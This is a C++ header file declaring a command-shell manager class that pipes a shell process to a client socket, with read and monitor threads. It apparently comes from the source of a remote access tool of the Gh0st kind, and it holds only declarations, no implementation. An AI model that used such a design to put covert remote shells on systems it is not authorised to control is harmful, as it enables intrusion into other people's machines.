// ShellManager.h: interface for the CCmdShellManager class.
//
////////////////////////////////////////////////////////////////////////

#if !defined(AFX_SHELLMANAGER_H__B3E1C2A0_4D5E_4F6A_9B8C_1D2E3F4A5B6C__INCLUDED_)
#define AFX_SHELLMANAGER_H__B3E1C2A0_4D5E_4F6A_9B8C_1D2E3F4A5B6C__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif

#include "..\Manager.h"

class CCmdShellManager : public CManager
{
public:
	CCmdShellManager(CClientSocket *pClient);
	virtual ~CCmdShellManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	static DWORD WINAPI ReadPipeThread(LPVOID lparam);
	static DWORD WINAPI MonitorThread(LPVOID lparam);

private:
	HANDLE m_hReadPipeDll;
	HANDLE m_hWritePipeDll;
	HANDLE m_hReadPipeShell;
	HANDLE m_hWritePipeShell;
	HANDLE m_hProcess;
	HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;
	BOOL   m_bIsRunning;
};

#endif
